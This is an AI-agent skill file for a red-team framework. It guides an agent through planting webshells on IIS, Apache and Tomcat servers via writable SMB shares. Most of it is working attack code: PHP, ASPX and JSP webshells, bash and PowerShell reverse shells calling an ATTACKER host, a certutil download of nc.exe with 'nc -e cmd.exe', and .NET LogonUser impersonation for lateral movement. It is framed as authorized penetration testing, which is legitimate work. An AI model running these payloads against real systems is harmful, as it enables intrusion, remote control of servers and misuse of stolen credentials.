---
name: smb-share-webshell
description: >
  Deploy webshells to IIS, Apache, or Tomcat web roots via SMB share write
  access. Use when a domain user has write access to a file share that maps
  to a web server's document root — write a webshell via smbclient/net use,
  then trigger it via HTTP for RCE. Covers PHP, ASPX, and JSP webshells,
  .NET impersonation for same-host lateral movement, and internal site
  discovery.
keywords:
  - smb webshell
  - smb share write
  - web root share
  - smbclient upload
  - write to web share
  - IIS webshell
  - ASPX webshell
  - PHP webshell
  - JSP webshell
  - share to RCE
  - net use webshell
  - webshell deployment
  - smb write rce
  - web share exploit
tools:
  - smbclient
  - netexec
  - curl
opsec: medium
---

# SMB Share Webshell Deployment

You are helping a penetration tester deploy webshells to web server document
roots via SMB share write access. The target has a file share that maps to a
web-accessible directory (IIS, Apache, XAMPP, Tomcat). The goal is to write a
webshell via SMB and trigger it via HTTP for remote code execution. All testing
is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[smb-share-webshell] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `smb-webshell-rce.txt`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## Scope Boundary

This skill covers writing webshells via SMB and achieving initial code
execution through them. When you reach the boundary of this scope — whether
through a routing instruction ("Route to **skill-name**") or by discovering
findings outside your domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Recommended next skill (the bold **skill-name** from routing instructions)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Tool Requirements (Local-Only)

**NEVER download, clone, install, or build tools.** The operator's attackbox
has a curated toolset — do not modify it.

If a tool required by this skill is not installed:
1. **STOP immediately** — do not attempt workarounds or alternative tools
2. Return to the orchestrator with: which tool is missing, what it's needed
   for, and the install command for the operator

**Check if a tool exists before reporting it missing:**

    which <tool> 2>/dev/null || find /opt /usr/share /usr/local ~/.local/bin \
        -name '<tool>' -type f 2>/dev/null | head -3

Tools provided via MCP (nmap, shell-server commands) and tools inside the
red-run Docker containers (evil-winrm, impacket, Responder, etc.) are always
available — do not check for these.

## Prerequisites

- Valid domain credentials for a user with **write access** to an SMB share
  that maps to a web server document root
- The web server must be reachable via HTTP/HTTPS to trigger the webshell
- Knowledge of the web server technology (IIS → ASPX, Apache/XAMPP → PHP,
  Tomcat → JSP)

### Special characters in credentials

Bash history expansion treats `!` as a special character. Passwords containing
`!`, `$`, backticks, or other shell metacharacters will be silently mangled.

**Canonical workaround** — write to file, read from file:

```bash
# Use the Write tool to create a password file
Write("/tmp/claude-1000/cred.txt", "P@ssw0rd!")

# Read into variable
PASS=$(cat /tmp/claude-1000/cred.txt)

# Use in smbclient
smbclient "//TARGET/ShareName" -U 'DOMAIN\user' --password="$PASS"
```

## Step 1: Assess — Identify Writable Web Shares

If the orchestrator has already identified the writable share and web
technology, skip to Step 2.

### List shares and check access

```bash
# List shares with authentication
nxc smb TARGET -u 'user' -p 'password' -d DOMAIN --shares

# Look for shares named: Web, wwwroot, inetpub, htdocs, webroot, www, html
# READ,WRITE access = potential web root
```

### Confirm share maps to web root

```bash
# Connect and look for web files
smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c 'ls'

# Look for: index.php, index.html, web.config, .htaccess, default.aspx
# Subdirectories matching vhosts (e.g., school.flight.htb/)
```

### Identify web technology

| Files Found | Technology | Webshell Type |
|-------------|-----------|---------------|
| `.php`, `index.php`, `.htaccess` | Apache/PHP or XAMPP | PHP |
| `web.config`, `.aspx`, `.asp` | IIS/ASP.NET | ASPX |
| `.jsp`, `.war`, `WEB-INF/` | Tomcat/Java | JSP |
| `index.html` only | Static — check for server-side engine | Try all |

## Step 2: Write Webshell via SMB

### PHP webshell

```bash
# Minimal PHP command shell
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/claude-1000/shell.php

# Upload via smbclient
smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c \
  'put /tmp/claude-1000/shell.php shell.php'

# If the share has subdirectories per vhost:
smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c \
  'cd site.target.htb; put /tmp/claude-1000/shell.php shell.php'
```

### ASPX webshell

```bash
# Minimal ASPX command shell (IIS)
cat > /tmp/claude-1000/shell.aspx << 'ASPX'
<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>
ASPX

smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c \
  'put /tmp/claude-1000/shell.aspx shell.aspx'
```

### JSP webshell

```bash
# Minimal JSP command shell (Tomcat)
cat > /tmp/claude-1000/shell.jsp << 'JSP'
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
JSP

# Better — with output:
cat > /tmp/claude-1000/shell.jsp << 'JSP'
<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>
JSP

smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c \
  'put /tmp/claude-1000/shell.jsp shell.jsp'
```

## Step 3: Trigger Webshell via HTTP

```bash
# PHP
curl -s "http://TARGET/shell.php?cmd=whoami"
curl -s "http://site.target.htb/shell.php?cmd=whoami"

# ASPX
curl -s "http://TARGET/shell.aspx?c=whoami"

# JSP
curl -s "http://TARGET/shell.jsp?cmd=whoami"
```

If the webshell responds with the service account name (e.g., `nt authority\local service`,
`flight\svc_apache`, `www-data`), you have RCE. Proceed to Step 4.

**If the webshell returns empty or 404:**
- Verify the share path maps to the web root (check subdirectories)
- Check if the web server serves from a vhost subdirectory
- Try both HTTP and HTTPS
- Check if the file extension is blocked by the web server config

## Step 4: Establish Reverse Shell

### Reverse Shell via MCP

1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
2. Send a reverse shell payload through the webshell:

**PHP (Linux):**
```bash
curl -s "http://TARGET/shell.php" --data-urlencode \
  "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"
```

**PHP (Windows — PowerShell):**
```bash
curl -s "http://TARGET/shell.php" --data-urlencode \
  "cmd=powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length))-ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
```

**ASPX (Windows — PowerShell):**
```bash
# Same PowerShell reverse shell, through the ASPX ?c= parameter
curl -s "http://TARGET/shell.aspx" --data-urlencode \
  "c=powershell -nop -c \"...\""
```

**ASPX (Windows — nc.exe):**
```bash
# First transfer nc.exe
curl -s "http://TARGET/shell.aspx?c=certutil+-urlcache+-f+http://ATTACKER:8080/nc.exe+C:\Windows\Temp\nc.exe"
# Then connect back
curl -s "http://TARGET/shell.aspx?c=C:\Windows\Temp\nc.exe+ATTACKER+PORT+-e+cmd.exe"
```

3. Call `list_sessions()` to verify the connection
4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
5. Enumerate the service account: `whoami`, `whoami /priv`, `whoami /groups`

## Step 5: Same-Host Lateral Movement via .NET Impersonation

When you have a shell as one service account (e.g., `svc_apache`) but need to
write files as a different user (e.g., deploy to an IIS site writable by
`C.Bum`), use .NET impersonation from the existing shell.

### Discover internal web sites

```cmd
:: Check for IIS sites
dir C:\inetpub\
netstat -ano | findstr :80
netstat -ano | findstr :8080
netstat -ano | findstr LISTENING

:: Check IIS bindings
%windir%\system32\inetsrv\appcmd list site
%windir%\system32\inetsrv\appcmd list app
```

### Write as another user via PowerShell + .NET impersonation

When you have credentials for a user who can write to a directory your current
account cannot, use LogonUser + WindowsImpersonationContext:

```powershell
# Impersonate C.Bum to write an ASPX webshell to IIS dev site
$code = @'
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
public class Impersonator {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain,
        string lpszPassword, int dwLogonType, int dwLogonProvider,
        out IntPtr phToken);
    public static void WriteAs(string domain, string user, string pass,
        string path, string content) {
        IntPtr token;
        LogonUser(user, domain, pass, 2, 0, out token);
        using(WindowsImpersonationContext ctx =
            WindowsIdentity.Impersonate(token)) {
            System.IO.File.WriteAllText(path, content);
        }
    }
}
'@
Add-Type -TypeDefinition $code

# Deploy ASPX webshell
$shell = '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>'
[Impersonator]::WriteAs("DOMAIN", "Username", "Password", "C:\inetpub\development\shell.aspx", $shell)
```

### Trigger the internal webshell

```cmd
:: From the existing shell, curl the internal site
curl http://localhost:8000/shell.aspx?c=whoami
powershell -c "(New-Object Net.WebClient).DownloadString('http://localhost:8000/shell.aspx?c=whoami')"
```

If the IIS AppPool runs with `SeImpersonatePrivilege`, catch a reverse shell
from it and report to the orchestrator for privilege escalation routing.

## Step 6: Escalate or Pivot

After achieving RCE through the webshell:

- **Service account with SeImpersonate**: STOP. Return to orchestrator
  recommending **windows-token-impersonation**. Pass: session ID, service
  account name, confirmed privileges.
- **Linux web server shell**: STOP. Return to orchestrator recommending
  **linux-discovery**. Pass: session ID, user context, target IP.
- **Windows web server shell**: STOP. Return to orchestrator recommending
  **windows-discovery**. Pass: session ID, user context, OS version.
- **Found internal sites or additional writable directories**: Note them in
  your return summary. The orchestrator will decide whether to deploy
  additional webshells.
- **Found credentials** (in config files, web.config, connection strings):
  Report them in your return summary for the orchestrator to record and test.

When routing, always pass along: target IP, current user, shell session ID,
web technology, and any additional writable paths discovered.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input

When stalled, return to the orchestrator with what was tried and why it failed.

## AV/EDR Detection

If the webshell is caught by antivirus — file vanishes after upload, 403 on
access despite correct path, or "blocked by administrator" errors:

```
### AV/EDR Blocked
- Payload: <webshell type> (e.g., "PHP system() webshell")
- Detection: <what happened> (e.g., "file quarantined after SMB write")
- AV product: <if known>
- Technique: SMB share webshell deployment
- Payload requirements: <web technology> webshell with command execution
- Target OS: <version>
- Current access: <user and method>
```

The orchestrator will route to **av-edr-evasion** for a bypass payload.

## Troubleshooting

### smbclient "NT_STATUS_ACCESS_DENIED"
- Verify credentials: `nxc smb TARGET -u user -p pass -d DOMAIN`
- Check share permissions: `nxc smb TARGET -u user -p pass --shares`
- The user may have read-only access — try a different share or user

### Webshell uploads but returns 404
- Share may not map to the web root — look for subdirectories
- Try vhost-specific paths: `cd site.target.htb; put shell.php`
- Check if the web server uses a different document root

### Webshell uploads but returns 403
- Web server may block the extension — try `.phtml`, `.php5`, `.phar` for PHP
- IIS may have handler restrictions — try `.ashx` or `.asmx` instead of `.aspx`
- Route to **file-upload-bypass** for comprehensive extension bypass methodology

### PowerShell .NET impersonation fails with "Access denied"
- LogonUser requires the target user to have "Allow log on locally" right
- Try `dwLogonType=9` (LOGON32_LOGON_NEW_CREDENTIALS) for network-only impersonation
- Verify credentials independently: `net use \\localhost\C$ /user:DOMAIN\user PASSWORD`

### Internal site not accessible from existing shell
- Check firewall: `netsh advfirewall firewall show rule name=all | findstr 8000`
- Verify the site is running: `netstat -ano | findstr :8000`
- Try `127.0.0.1` instead of `localhost`
